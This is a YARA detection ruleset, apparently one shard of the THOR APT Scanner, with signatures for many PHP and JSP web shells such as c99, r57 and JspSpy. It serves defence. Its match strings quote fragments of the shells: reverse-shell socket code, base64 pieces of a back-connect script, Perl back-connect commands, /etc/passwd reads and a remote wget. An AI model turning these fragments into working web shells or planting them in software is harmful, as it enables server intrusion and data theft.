/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

/*

   THOR APT Scanner - Web Shells Extract
   This rulset is a subset of all hack tool rules included in our
   APT Scanner THOR - the full featured APT scanner

   We will frequently update this file with new rules rated TLP:WHITE

   Florian Roth
   BSK Consulting GmbH
   Web: bsk-consulting.de

   revision: 20150122

*/

/* Generated from WShell_THOR_Webshells.yar; shard 3. Do not edit generated shards independently. */

rule webshell_r57shell_r57shell127_SnIpEr_SA_Shell_EgY_SpIdEr_ShElL_V2_r57_xxx {
	meta:
		description = "Web Shell - from files r57shell.php, r57shell127.php, SnIpEr_SA Shell.php, EgY_SpIdEr ShElL V2.php, r57_iFX.php, r57_kartal.php, r57_Mohajer22.php, r57.php, r57.php, Backdoor.PHP.Agent.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "ef43fef943e9df90ddb6257950b3538f"
		hash1 = "ae025c886fbe7f9ed159f49593674832"
		hash2 = "911195a9b7c010f61b66439d9048f400"
		hash3 = "697dae78c040150daff7db751fc0c03c"
		hash4 = "513b7be8bd0595c377283a7c87b44b2e"
		hash5 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash6 = "e5b2131dd1db0dbdb43b53c5ce99016a"
		hash7 = "4108f28a9792b50d95f95b9e5314fa1e"
		hash8 = "41af6fd253648885c7ad2ed524e0692d"
		hash9 = "6fcc283470465eed4870bcc3e2d7f14d"
	strings:
		$s2 = "echo sr(15,\"<b>\".$lang[$language.'_text58'].$arrow.\"</b>\",in('text','mk_name"
		$s3 = "echo sr(15,\"<b>\".$lang[$language.'_text21'].$arrow.\"</b>\",in('checkbox','nf1"
		$s9 = "echo sr(40,\"<b>\".$lang[$language.'_text26'].$arrow.\"</b>\",\"<select size="
	condition:
		all of them
}

rule webshell_807_a_css_dm_he1p_JspSpy_xxx {
	meta:
		description = "Web Shell - from files 807.jsp, a.jsp, css.jsp, dm.jsp, he1p.jsp, JspSpy.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, luci.jsp.spy2009.jsp, m.jsp, ma3.jsp, mmym520.jsp, nogfw.jsp, ok.jsp, style.jsp, u.jsp, xia.jsp, cofigrue.jsp, 1.jsp, jspspy.jsp, jspspy_k8.jsp, JspSpy.jsp, JspSpyJDK5.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
		hash1 = "76037ebd781ad0eac363d56fc81f4b4f"
		hash2 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
		hash3 = "14e9688c86b454ed48171a9d4f48ace8"
		hash4 = "b330a6c2d49124ef0729539761d6ef0b"
		hash5 = "d71716df5042880ef84427acee8b121e"
		hash6 = "341298482cf90febebb8616426080d1d"
		hash7 = "29aebe333d6332f0ebc2258def94d57e"
		hash8 = "42654af68e5d4ea217e6ece5389eb302"
		hash9 = "88fc87e7c58249a398efd5ceae636073"
		hash10 = "4a812678308475c64132a9b56254edbc"
		hash11 = "9626eef1a8b9b8d773a3b2af09306a10"
		hash12 = "344f9073576a066142b2023629539ebd"
		hash13 = "32dea47d9c13f9000c4c807561341bee"
		hash14 = "b9744f6876919c46a29ea05b1d95b1c3"
		hash15 = "6acc82544be056580c3a1caaa4999956"
		hash16 = "6aa32a6392840e161a018f3907a86968"
		hash17 = "349ec229e3f8eda0f9eb918c74a8bf4c"
		hash18 = "3ea688e3439a1f56b16694667938316d"
		hash19 = "ab77e4d1006259d7cbc15884416ca88c"
		hash20 = "71097537a91fac6b01f46f66ee2d7749"
		hash21 = "2434a7a07cb47ce25b41d30bc291cacc"
		hash22 = "7a4b090619ecce6f7bd838fe5c58554b"
	strings:
		$s1 = "\"<h2>Remote Control &raquo;</h2><input class=\\\"bt\\\" onclick=\\\"var"
		$s2 = "\"<p>Current File (import new file name and new file)<br /><input class=\\\"inpu"
		$s3 = "\"<p>Current file (fullpath)<br /><input class=\\\"input\\\" name=\\\"file\\\" i"
	condition:
		all of them
}

rule webshell_201_3_ma_download {
	meta:
		description = "Web Shell - from files 201.jsp, 3.jsp, ma.jsp, download.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "a7e25b8ac605753ed0c438db93f6c498"
		hash1 = "fb8c6c3a69b93e5e7193036fd31a958d"
		hash2 = "4cc68fa572e88b669bce606c7ace0ae9"
		hash3 = "fa87bbd7201021c1aefee6fcc5b8e25a"
	strings:
		$s0 = "<input title=\"Upload selected file to the current working directory\" type=\"Su"
		$s5 = "<input title=\"Launch command in current directory\" type=\"Submit\" class=\"but"
		$s6 = "<input title=\"Delete all selected files and directories incl. subdirs\" class="
	condition:
		all of them
}

rule webshell_browser_201_3_400_in_JFolder_jfolder01_jsp_leo_ma_warn_webshell_nc_download {
	meta:
		description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, 400.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, ma.jsp, warn.jsp, webshell-nc.jsp, download.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "37603e44ee6dc1c359feb68a0d566f76"
		hash1 = "a7e25b8ac605753ed0c438db93f6c498"
		hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
		hash3 = "36331f2c81bad763528d0ae00edf55be"
		hash4 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash5 = "8979594423b68489024447474d113894"
		hash6 = "ec482fc969d182e5440521c913bab9bd"
		hash7 = "f98d2b33cd777e160d1489afed96de39"
		hash8 = "4b4c12b3002fad88ca6346a873855209"
		hash9 = "4cc68fa572e88b669bce606c7ace0ae9"
		hash10 = "e9a5280f77537e23da2545306f6a19ad"
		hash11 = "598eef7544935cf2139d1eada4375bb5"
		hash12 = "fa87bbd7201021c1aefee6fcc5b8e25a"
	strings:
		$s4 = "UplInfo info = UploadMonitor.getInfo(fi.clientFileName);" fullword
		$s5 = "long time = (System.currentTimeMillis() - starttime) / 1000l;" fullword
	condition:
		all of them
}

rule webshell_shell_phpspy_2006_arabicspy {
	meta:
		description = "Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "791708057d8b429d91357d38edf43cc0"
		hash1 = "40a1f840111996ff7200d18968e42cfe"
		hash2 = "e0202adff532b28ef1ba206cf95962f2"
	strings:
		$s0 = "elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype"
		$s8 = "echo \"<form action=\\\"?action=shell&dir=\".urlencode($dir).\"\\\" method=\\\"P"
	condition:
		all of them
}

rule webshell_in_JFolder_jfolder01_jsp_leo_warn {
	meta:
		description = "Web Shell - from files in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash1 = "8979594423b68489024447474d113894"
		hash2 = "ec482fc969d182e5440521c913bab9bd"
		hash3 = "f98d2b33cd777e160d1489afed96de39"
		hash4 = "4b4c12b3002fad88ca6346a873855209"
		hash5 = "e9a5280f77537e23da2545306f6a19ad"
	strings:
		$s4 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strD"
		$s9 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDi"
	condition:
		all of them
}

rule webshell_2_520_icesword_job_ma1_ma4_2 {
	meta:
		description = "Web Shell - from files 2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp, ma4.jsp, 2.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "64a3bf9142b045b9062b204db39d4d57"
		hash1 = "9abd397c6498c41967b4dd327cf8b55a"
		hash2 = "077f4b1b6d705d223b6d644a4f3eebae"
		hash3 = "56c005690da2558690c4aa305a31ad37"
		hash4 = "532b93e02cddfbb548ce5938fe2f5559"
		hash5 = "6e0fa491d620d4af4b67bae9162844ae"
		hash6 = "7eabe0f60975c0c73d625b7ddf7b9cbd"
	strings:
		$s2 = "private String[] _textFileTypes = {\"txt\", \"htm\", \"html\", \"asp\", \"jsp\","
		$s3 = "\\\" name=\\\"upFile\\\" size=\\\"8\\\" class=\\\"textbox\\\" />&nbsp;<input typ"
		$s9 = "if (request.getParameter(\"password\") == null && session.getAttribute(\"passwor"
	condition:
		all of them
}

rule webshell_phpspy_2005_full_phpspy_2005_lite_PHPSPY {
	meta:
		description = "Web Shell - from files phpspy_2005_full.php, phpspy_2005_lite.php, PHPSPY.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash1 = "42f211cec8032eb0881e87ebdb3d7224"
		hash2 = "0712e3dc262b4e1f98ed25760b206836"
	strings:
		$s6 = "<input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['comma"
		$s7 = "echo $msg=@copy($_FILES['uploadmyfile']['tmp_name'],\"\".$uploaddir.\"/\".$_FILE"
		$s8 = "<option value=\"passthru\" <? if ($execfunc==\"passthru\") { echo \"selected\"; "
	condition:
		2 of them
}

rule webshell_shell_phpspy_2006_arabicspy_hkrkoz {
	meta:
		description = "Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php, hkrkoz.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "791708057d8b429d91357d38edf43cc0"
		hash1 = "40a1f840111996ff7200d18968e42cfe"
		hash2 = "e0202adff532b28ef1ba206cf95962f2"
		hash3 = "802f5cae46d394b297482fd0c27cb2fc"
	strings:
		$s5 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname."
	condition:
		all of them
}

rule webshell_c99_Shell_ci_Biz_was_here_c100_v_xxx {
	meta:
		description = "Web Shell - from files c99.php, Shell [ci] .Biz was here.php, c100 v. 777shell v. Undetectable #18a Modded by 777 - Don.php, c66.php, c99-shadows-mod.php, c99shell.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "61a92ce63369e2fa4919ef0ff7c51167"
		hash1 = "f2fa878de03732fbf5c86d656467ff50"
		hash2 = "27786d1e0b1046a1a7f67ee41c64bf4c"
		hash3 = "0f5b9238d281bc6ac13406bb24ac2a5b"
		hash4 = "68c0629d08b1664f5bcce7d7f5f71d22"
		hash5 = "048ccc01b873b40d57ce25a4c56ea717"
	strings:
		$s8 = "else {echo \"Running datapipe... ok! Connect to <b>\".getenv(\"SERVER_ADDR\""
	condition:
		all of them
}

rule webshell_2008_2009lite_2009mssql {
	meta:
		description = "Web Shell - from files 2008.php, 2009lite.php, 2009mssql.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "3e4ba470d4c38765e4b16ed930facf2c"
		hash1 = "3f4d454d27ecc0013e783ed921eeecde"
		hash2 = "aa17b71bb93c6789911bd1c9df834ff9"
	strings:
		$s0 = "<a href=\"javascript:godir(\\''.$drive->Path.'/\\');"
		$s7 = "p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all"
	condition:
		all of them
}

rule webshell_shell_phpspy_2005_full_phpspy_2005_lite_phpspy_2006_arabicspy_PHPSPY_hkrkoz {
	meta:
		description = "Web Shell - from files shell.php, phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, arabicspy.php, PHPSPY.php, hkrkoz.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "791708057d8b429d91357d38edf43cc0"
		hash1 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash2 = "42f211cec8032eb0881e87ebdb3d7224"
		hash3 = "40a1f840111996ff7200d18968e42cfe"
		hash4 = "e0202adff532b28ef1ba206cf95962f2"
		hash5 = "0712e3dc262b4e1f98ed25760b206836"
		hash6 = "802f5cae46d394b297482fd0c27cb2fc"
	strings:
		$s0 = "$mainpath_info           = explode('/', $mainpath);" fullword
		$s6 = "if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == \"d"
	condition:
		all of them
}

rule webshell_807_dm_JspSpyJDK5_m_cofigrue {
	meta:
		description = "Web Shell - from files 807.jsp, dm.jsp, JspSpyJDK5.jsp, m.jsp, cofigrue.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
		hash1 = "14e9688c86b454ed48171a9d4f48ace8"
		hash2 = "341298482cf90febebb8616426080d1d"
		hash3 = "88fc87e7c58249a398efd5ceae636073"
		hash4 = "349ec229e3f8eda0f9eb918c74a8bf4c"
	strings:
		$s1 = "url_con.setRequestProperty(\"REFERER\", \"\"+fckal+\"\");" fullword
		$s9 = "FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");" fullword
	condition:
		1 of them
}

rule webshell_Dive_Shell_1_0_Emperor_Hacking_Team_xxx {
	meta:
		description = "Web Shell - from files Dive Shell 1.0 - Emperor Hacking Team.php, phpshell.php, SimShell 1.0 - Simorgh Security MGZ.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "1b5102bdc41a7bc439eea8f0010310a5"
		hash1 = "f8a6d5306fb37414c5c772315a27832f"
		hash2 = "37cb1db26b1b0161a4bf678a6b4565bd"
	strings:
		$s1 = "if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== fals"
		$s9 = "if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command'])) {" fullword
	condition:
		all of them
}

rule webshell_404_data_in_JFolder_jfolder01_xxx {
	meta:
		description = "Web Shell - from files 404.jsp, data.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, suiyue.jsp, warn.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "7066f4469c3ec20f4890535b5f299122"
		hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
		hash2 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash3 = "8979594423b68489024447474d113894"
		hash4 = "ec482fc969d182e5440521c913bab9bd"
		hash5 = "f98d2b33cd777e160d1489afed96de39"
		hash6 = "4b4c12b3002fad88ca6346a873855209"
		hash7 = "c93d5bdf5cf62fe22e299d0f2b865ea7"
		hash8 = "e9a5280f77537e23da2545306f6a19ad"
	strings:
		$s4 = "&nbsp;<TEXTAREA NAME=\"cqq\" ROWS=\"20\" COLS=\"100%\"><%=sbCmd.toString()%></TE"
	condition:
		all of them
}

rule webshell_jsp_reverse_jsp_reverse_jspbd {
	meta:
		description = "Web Shell - from files jsp-reverse.jsp, jsp-reverse.jsp, jspbd.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		super_rule = 1
		hash0 = "8b0e6779f25a17f0ffb3df14122ba594"
		hash1 = "ea87f0c1f0535610becadf5a98aca2fc"
		hash2 = "7d5e9732766cf5b8edca9b7ae2b6028f"
		score = 50
	strings:
		$s0 = "osw = new BufferedWriter(new OutputStreamWriter(os));" fullword
		$s7 = "sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());" fullword
		$s9 = "isr = new BufferedReader(new InputStreamReader(is));" fullword
	condition:
		all of them
}

rule webshell_400_in_JFolder_jfolder01_jsp_leo_warn_webshell_nc {
	meta:
		description = "Web Shell - from files 400.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp, webshell-nc.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "36331f2c81bad763528d0ae00edf55be"
		hash1 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash2 = "8979594423b68489024447474d113894"
		hash3 = "ec482fc969d182e5440521c913bab9bd"
		hash4 = "f98d2b33cd777e160d1489afed96de39"
		hash5 = "4b4c12b3002fad88ca6346a873855209"
		hash6 = "e9a5280f77537e23da2545306f6a19ad"
		hash7 = "598eef7544935cf2139d1eada4375bb5"
	strings:
		$s0 = "sbFolder.append(\"<tr><td >&nbsp;</td><td>\");" fullword
		$s1 = "return filesize / intDivisor + \".\" + strAfterComma + \" \" + strUnit;" fullword
		$s5 = "FileInfo fi = (FileInfo) ht.get(\"cqqUploadFile\");" fullword
		$s6 = "<input type=\"hidden\" name=\"cmd\" value=\"<%=strCmd%>\">" fullword
	condition:
		2 of them
}

rule webshell_2_520_job_JspWebshell_1_2_ma1_ma4_2 {
	meta:
		description = "Web Shell - from files 2.jsp, 520.jsp, job.jsp, JspWebshell 1.2.jsp, ma1.jsp, ma4.jsp, 2.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "64a3bf9142b045b9062b204db39d4d57"
		hash1 = "9abd397c6498c41967b4dd327cf8b55a"
		hash2 = "56c005690da2558690c4aa305a31ad37"
		hash3 = "70a0ee2624e5bbe5525ccadc467519f6"
		hash4 = "532b93e02cddfbb548ce5938fe2f5559"
		hash5 = "6e0fa491d620d4af4b67bae9162844ae"
		hash6 = "7eabe0f60975c0c73d625b7ddf7b9cbd"
	strings:
		$s1 = "while ((nRet = insReader.read(tmpBuffer, 0, 1024)) != -1) {" fullword
		$s6 = "password = (String)session.getAttribute(\"password\");" fullword
		$s7 = "insReader = new InputStreamReader(proc.getInputStream(), Charset.forName(\"GB231"
	condition:
		2 of them
}

rule webshell_shell_2008_2009mssql_phpspy_2005_full_phpspy_2006_arabicspy_hkrkoz {
	meta:
		description = "Web Shell - from files shell.php, 2008.php, 2009mssql.php, phpspy_2005_full.php, phpspy_2006.php, arabicspy.php, hkrkoz.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 60
		super_rule = 1
		hash0 = "791708057d8b429d91357d38edf43cc0"
		hash1 = "3e4ba470d4c38765e4b16ed930facf2c"
		hash2 = "aa17b71bb93c6789911bd1c9df834ff9"
		hash3 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash4 = "40a1f840111996ff7200d18968e42cfe"
		hash5 = "e0202adff532b28ef1ba206cf95962f2"
		hash6 = "802f5cae46d394b297482fd0c27cb2fc"
	strings:
		$s0 = "$tabledump .= \"'\".mysql_escape_string($row[$fieldcounter]).\"'\";" fullword
		$s5 = "while(list($kname, $columns) = @each($index)) {" fullword
		$s6 = "$tabledump = \"DROP TABLE IF EXISTS $table;\\n\";" fullword
		$s9 = "$tabledump .= \"   PRIMARY KEY ($colnames)\";" fullword
		$fn = "filename: backup"
	condition:
		2 of ($s*) and not $fn
}

rule webshell_gfs_sh_r57shell_r57shell127_SnIpEr_SA_xxx {
	meta:
		description = "Web Shell - from files gfs_sh.php, r57shell.php, r57shell127.php, SnIpEr_SA Shell.php, EgY_SpIdEr ShElL V2.php, r57_iFX.php, r57_kartal.php, r57_Mohajer22.php, r57.php, r57.php, Backdoor.PHP.Agent.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "a2516ac6ee41a7cf931cbaef1134a9e4"
		hash1 = "ef43fef943e9df90ddb6257950b3538f"
		hash2 = "ae025c886fbe7f9ed159f49593674832"
		hash3 = "911195a9b7c010f61b66439d9048f400"
		hash4 = "697dae78c040150daff7db751fc0c03c"
		hash5 = "513b7be8bd0595c377283a7c87b44b2e"
		hash6 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash7 = "e5b2131dd1db0dbdb43b53c5ce99016a"
		hash8 = "4108f28a9792b50d95f95b9e5314fa1e"
		hash9 = "41af6fd253648885c7ad2ed524e0692d"
		hash10 = "6fcc283470465eed4870bcc3e2d7f14d"
	strings:
		$s0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI"
		$s11 = "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KIC"
	condition:
		all of them
}

rule webshell_itsec_PHPJackal_itsecteam_shell_jHn {
	meta:
		description = "Web Shell - from files itsec.php, PHPJackal.php, itsecteam_shell.php, jHn.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "8ae9d2b50dc382f0571cd7492f079836"
		hash1 = "e2830d3286001d1455479849aacbbb38"
		hash2 = "bd6d3b2763c705a01cc2b3f105a25fa4"
		hash3 = "40c6ecf77253e805ace85f119fe1cebb"
	strings:
		$s0 = "$link=pg_connect(\"host=$host dbname=$db user=$user password=$pass\");" fullword
		$s6 = "while($data=ocifetchinto($stm,$data,OCI_ASSOC+OCI_RETURN_NULLS))$res.=implode('|"
		$s9 = "while($data=pg_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+"
	condition:
		2 of them
}

rule webshell_Shell_ci_Biz_was_here_c100_v_xxx {
	meta:
		description = "Web Shell - from files Shell [ci] .Biz was here.php, c100 v. 777shell v. Undetectable #18a Modded by 777 - Don.php, c99-shadows-mod.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "f2fa878de03732fbf5c86d656467ff50"
		hash1 = "27786d1e0b1046a1a7f67ee41c64bf4c"
		hash2 = "68c0629d08b1664f5bcce7d7f5f71d22"
	strings:
		$s2 = "if ($data{0} == \"\\x99\" and $data{1} == \"\\x01\") {return \"Error: \".$stri"
		$s3 = "<OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\""
		$s4 = "<OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CPUINFO" fullword
		$s7 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/de"
		$s9 = "<OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">USER"
	condition:
		2 of them
}

rule webshell_NIX_REMOTE_WEB_SHELL_NIX_REMOTE_WEB_xxx1 {
	meta:
		description = "Web Shell - from files NIX REMOTE WEB-SHELL.php, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php, KAdot Universal Shell v0.1.6.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "0b19e9de790cd2f4325f8c24b22af540"
		hash1 = "f3ca29b7999643507081caab926e2e74"
		hash2 = "527cf81f9272919bf872007e21c4bdda"
	strings:
		$s1 = "<td><input size=\"48\" value=\"$docr/\" name=\"path\" type=\"text\"><input type="
		$s2 = "$uploadfile = $_POST['path'].$_FILES['file']['name'];" fullword
		$s6 = "elseif (!empty($_POST['ac'])) {$ac = $_POST['ac'];}" fullword
		$s7 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}" fullword
	condition:
		2 of them
}

rule webshell_c99_c99shell_c99_w4cking_Shell_xxx {
	meta:
		description = "Web Shell - from files c99.php, c99shell.php, c99_w4cking.php, Shell [ci] .Biz was here.php, acid.php, c100 v. 777shell v. Undetectable #18a Modded by 777 - Don.php, c66.php, c99-shadows-mod.php, c99.php, c99shell.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "61a92ce63369e2fa4919ef0ff7c51167"
		hash1 = "d3f38a6dc54a73d304932d9227a739ec"
		hash2 = "9c34adbc8fd8d908cbb341734830f971"
		hash3 = "f2fa878de03732fbf5c86d656467ff50"
		hash4 = "b8f261a3cdf23398d573aaf55eaf63b5"
		hash5 = "27786d1e0b1046a1a7f67ee41c64bf4c"
		hash6 = "0f5b9238d281bc6ac13406bb24ac2a5b"
		hash7 = "68c0629d08b1664f5bcce7d7f5f71d22"
		hash8 = "157b4ac3c7ba3a36e546e81e9279eab5"
		hash9 = "048ccc01b873b40d57ce25a4c56ea717"
	strings:
		$s0 = "echo \"<b>HEXDUMP:</b><nobr>"
		$s4 = "if ($filestealth) {$stat = stat($d.$f);}" fullword
		$s5 = "while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo \"<tr><td>\".$r"
		$s6 = "if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo \"DB "
		$s8 = "echo \"<center><b>Server-status variables:</b><br><br>\";" fullword
		$s9 = "echo \"<textarea cols=80 rows=10>\".htmlspecialchars($encoded).\"</textarea>"
	condition:
		2 of them
}

rule webshell_2008_2009mssql_phpspy_2005_full_phpspy_2006_arabicspy_hkrkoz {
	meta:
		description = "Web Shell - from files 2008.php, 2009mssql.php, phpspy_2005_full.php, phpspy_2006.php, arabicspy.php, hkrkoz.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "3e4ba470d4c38765e4b16ed930facf2c"
		hash1 = "aa17b71bb93c6789911bd1c9df834ff9"
		hash2 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash3 = "40a1f840111996ff7200d18968e42cfe"
		hash4 = "e0202adff532b28ef1ba206cf95962f2"
		hash5 = "802f5cae46d394b297482fd0c27cb2fc"
	strings:
		$s0 = "$this -> addFile($content, $filename);" fullword
		$s3 = "function addFile($data, $name, $time = 0) {" fullword
		$s8 = "function unix2DosTime($unixtime = 0) {" fullword
		$s9 = "foreach($filelist as $filename){" fullword
	condition:
		all of them
}

rule webshell_c99_c66_c99_shadows_mod_c99shell {
	meta:
		description = "Web Shell - from files c99.php, c66.php, c99-shadows-mod.php, c99shell.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "61a92ce63369e2fa4919ef0ff7c51167"
		hash1 = "0f5b9238d281bc6ac13406bb24ac2a5b"
		hash2 = "68c0629d08b1664f5bcce7d7f5f71d22"
		hash3 = "048ccc01b873b40d57ce25a4c56ea717"
	strings:
		$s2 = "  if (unlink(_FILE_)) {@ob_clean(); echo \"Thanks for using c99shell v.\".$shv"
		$s3 = "  \"c99sh_backconn.pl\"=>array(\"Using PERL\",\"perl %path %host %port\")," fullword
		$s4 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#66"
		$s7 = "   elseif (!$data = c99getsource($bind[\"src\"])) {echo \"Can't download sources"
		$s8 = "  \"c99sh_datapipe.pl\"=>array(\"Using PERL\",\"perl %path %localport %remotehos"
		$s9 = "   elseif (!$data = c99getsource($bc[\"src\"])) {echo \"Can't download sources!"
	condition:
		2 of them
}

rule webshell_he1p_JspSpy_nogfw_ok_style_1_JspSpy1 {
	meta:
		description = "Web Shell - from files he1p.jsp, JspSpy.jsp, nogfw.jsp, ok.jsp, style.jsp, 1.jsp, JspSpy.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "b330a6c2d49124ef0729539761d6ef0b"
		hash1 = "d71716df5042880ef84427acee8b121e"
		hash2 = "344f9073576a066142b2023629539ebd"
		hash3 = "32dea47d9c13f9000c4c807561341bee"
		hash4 = "b9744f6876919c46a29ea05b1d95b1c3"
		hash5 = "3ea688e3439a1f56b16694667938316d"
		hash6 = "2434a7a07cb47ce25b41d30bc291cacc"
	strings:
		$s0 = "\"\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>\"+" fullword
		$s4 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?"
		$s7 = "String execute = f.canExecute() ? \"checked=\\\"checked\\\"\" : \"\";" fullword
		$s8 = "\"<td nowrap>\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>"
	condition:
		2 of them
}

rule webshell_000_403_c5_config_myxx_queryDong_spyjsp2010_zend {
	meta:
		description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, config.jsp, myxx.jsp, queryDong.jsp, spyjsp2010.jsp, zend.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "8b457934da3821ba58b06a113e0d53d9"
		hash3 = "d44df8b1543b837e57cc8f25a0a68d92"
		hash4 = "e0354099bee243702eb11df8d0e046df"
		hash5 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash6 = "655722eaa6c646437c8ae93daac46ae0"
		hash7 = "591ca89a25f06cf01e4345f98a22845c"
	strings:
		$s0 = "return new Double(format.format(value)).doubleValue();" fullword
		$s5 = "File tempF = new File(savePath);" fullword
		$s9 = "if (tempF.isDirectory()) {" fullword
	condition:
		2 of them
}

rule webshell_c99_c99shell_c99_c99shell {
	meta:
		description = "Web Shell - from files c99.php, c99shell.php, c99.php, c99shell.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "61a92ce63369e2fa4919ef0ff7c51167"
		hash1 = "d3f38a6dc54a73d304932d9227a739ec"
		hash2 = "157b4ac3c7ba3a36e546e81e9279eab5"
		hash3 = "048ccc01b873b40d57ce25a4c56ea717"
	strings:
		$s2 = "$bindport_pass = \"c99\";" fullword
		$s5 = " else {echo \"<b>Execution PHP-code</b>\"; if (empty($eval_txt)) {$eval_txt = tr"
	condition:
		1 of them
}

rule webshell_r57shell127_r57_iFX_r57_kartal_r57_antichat {
	meta:
		description = "Web Shell - from files r57shell127.php, r57_iFX.php, r57_kartal.php, r57.php, antichat.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "ae025c886fbe7f9ed159f49593674832"
		hash1 = "513b7be8bd0595c377283a7c87b44b2e"
